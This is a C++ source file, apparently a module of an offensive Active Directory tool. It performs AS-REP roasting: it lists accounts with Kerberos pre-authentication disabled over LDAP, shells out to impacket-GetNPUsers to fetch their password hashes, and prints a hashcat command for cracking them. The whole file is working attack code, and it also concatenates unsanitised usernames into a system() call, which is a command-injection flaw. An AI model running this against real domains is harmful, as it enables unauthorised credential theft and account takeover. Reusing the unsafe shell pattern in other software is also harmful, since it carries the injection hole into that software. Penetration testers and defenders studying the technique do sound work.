#include <iostream>
#include <algorithm>
#include "Attacks.h"
#include <sstream>
#include "utils/Colors.h"
#include "cli/ArgumentParser.h"
#include "core/ActiveDirectory.h"
#include "core/ModuleRegistry.h"

namespace {
const ModuleRegistry::Registrar registrar(
    Modules::ASREPROAST,
    [](const ModuleFactoryContext& ctx) -> std::unique_ptr<Module> {
        return std::make_unique<Attacks::ASREPRoast>(ctx.ldapService);
    });
}  // namespace

Attacks::ASREPRoast::ASREPRoast(LdapQuerier& ldap_) : ldap(ldap_) {}

std::string Attacks::ASREPRoast::extractDomainFromDN(const std::string& baseDN) {
    std::string domain;
    std::string token;
    std::istringstream tokenStream(baseDN);
    bool first = true;

    // Split the DN on commas
    while (std::getline(tokenStream, token, ',')) {
        // 1. Trim leading whitespace from this component
        size_t firstChar = token.find_first_not_of(' ');
        if (firstChar != std::string::npos) {
            token = token.substr(firstChar);
        }

        // 2. Keep only Domain Components; accept both "DC=" and "dc="
        if (token.size() > 3 &&
           (token.substr(0, 3) == "DC=" || token.substr(0, 3) == "dc=")) {

            if (!first) {
                domain += ".";
            }

            // Append everything after the "DC=" prefix
            domain += token.substr(3);
            first = false;
        }
    }
    
    return domain;
}


std::vector<std::string>  Attacks::ASREPRoast::listUser(const std::string& baseDN) {
    std::cout << Colors::COLOR_YELLOW << "[*] Enumerating asreproastable users" << Colors::COLOR_RESET << std::endl;

    std::vector<std::string> asreproast_user;
    // Normal user accounts that have "do not require Kerberos pre-auth" set.
    std::string query =
        std::string("(&(samAccountType=") + AD::SamAccountType::NormalUser + ")"
        "(userAccountControl:" + AD::MatchingRuleBitAnd + ":=" +
        std::to_string(AD::Uac::DontRequirePreauth) + "))";
    std::vector<std::string> attrs = {"sAMAccountName"};

    auto results = ldap.executeQueryAndUnpackData(baseDN, query, attrs);

    for (const auto& userObject : results) {
        auto user = userObject.find("sAMAccountName");
        if (user != userObject.end()) {
            std::string username = user->second.front();
            std::cout << "  [+] User: " << username << std::endl;
            asreproast_user.push_back(username);
        }
    }
    return asreproast_user;
}

bool Attacks::ASREPRoast::requestTicket(const std::string& vuln_user, const std::string& domain) {
    std::cout << Colors::COLOR_YELLOW << "\n[*] Requesting AS-REP ticket for: " << vuln_user  << Colors::COLOR_RESET << std::endl;

    std::string cmd = "impacket-GetNPUsers " + domain + "/" + vuln_user + " -no-pass -request -format hashcat";
    int result = system(cmd.c_str());

    if (result == 0) {
        std::cout << Colors::COLOR_GREEN << "  [+] Hash for " << vuln_user << " successfully retrieved" << Colors::COLOR_RESET << std::endl;
        std::cout << "  [*] To crack, run: hashcat -m 18200 hash /path/to/wordlist.txt" << std::endl;
        return true;
    } else {
        std::cerr << Colors::COLOR_RED << "  [-] Failed to request ticket for " << vuln_user << ". Is impacket-GetNPUsers in your PATH?" << Colors::COLOR_RESET << std::endl;
        return false;
    }
}

void Attacks::ASREPRoast::run(const ModuleRuntimeContext& ctx) {
    std::vector<std::string> vuln_users = listUser(ctx.baseDN);

    if (vuln_users.empty()) {
        std::cout << "[-] No ASREPRoastable users found." << std::endl;
        return;
    }

    std::string domain = extractDomainFromDN(ctx.baseDN);

    for (const std::string& user : vuln_users) {
        requestTicket(user, domain);
    }
}